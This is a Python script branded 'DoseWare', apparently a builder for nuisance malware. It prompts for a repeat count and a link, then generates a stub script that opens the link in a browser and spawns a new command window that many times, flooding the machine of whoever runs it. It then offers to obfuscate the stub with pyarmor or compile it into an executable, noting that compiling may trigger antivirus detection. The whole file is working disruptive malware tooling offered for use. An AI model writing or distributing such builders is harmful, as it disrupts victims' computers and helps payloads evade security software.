import os
from colorama import *
import time
import random
import string
import pymatrix

def main():
    for _ in range(25):
        time.sleep(0.05)
        length = 15
        randstr = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
        os.system(f"title {randstr}")
    os.system(f"title \\\ DoseWare //")
    os.system("cls")
    print(f"\n{Style.NORMAL}{Fore.RESET}dose{Style.DIM}{Fore.MAGENTA}ware{Fore.RESET}{Style.NORMAL}")

    print("\nSpam Amount\n")
    times = input(f"> {Style.DIM}{Fore.MAGENTA}")

    os.system("cls")
    print(f"\n{Style.NORMAL}{Fore.RESET}dose{Style.DIM}{Fore.MAGENTA}ware{Fore.RESET}{Style.NORMAL}")
    print(f"\n{Style.NORMAL}{Fore.RESET}Enter A Link To Spam\n")
    msg = input(f"> {Style.DIM}{Fore.MAGENTA}")

    file666 = f'''import os\nimport webbrowser\nfor _ in range({times}):\n    webbrowser.open("{msg}")\n    os.system("start cmd")'''

    os.system("cls")
    print(f"\n{Style.NORMAL}{Fore.RESET}dose{Style.DIM}{Fore.MAGENTA}ware{Fore.RESET}{Style.NORMAL}")
    print(f"\n{Style.NORMAL}{Fore.RESET}Set A Name A For The Stub\n")
    filename = input(f"> {Style.DIM}{Fore.MAGENTA}")

    with open(f"{filename}.py", "w") as file:
        file.write(file666)

    os.system("cls")
    print(f"{Style.NORMAL}{Fore.RESET}building...")
    for _ in range(30):
        time.sleep(0.05)
        length = 15
        randstr = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
        os.system(f"title {randstr}")
    print(f"{Style.NORMAL}{Fore.RESET}[ {Fore.GREEN}+{Fore.RESET} ] {Fore.GREEN}{filename}.py{Fore.RESET} Has Been Generated Successfully\n")
    print(f"{Style.NORMAL}Addittional settings: {Fore.MAGENTA}1{Fore.RESET} -> obfuscate  |  {Fore.MAGENTA}2{Fore.RESET} -> compile")
    print("ctrl + c to exit")
    ask1 = input("> ")

    if ask1 == "1":
        os.system("pip install pyarmor")
        os.system(f"pyarmor gen {filename}.py")
        print("Success")
    if ask1 == "2":
        print(f"Compilling may cause some av detection\nwant to continue [y/n]")
        comp = input(">")
        if comp.lower() == "y":
            os.system("pip install pyinstaller > nul")
            os.system(f"pyinstaller --onefile {filename}.py > nul")
            os.system("cls")
            print("Succesfully compiled")
        if comp.lower == "n":
            exit
        
    else:
        print(f"{ask1} is incorrect")

main()
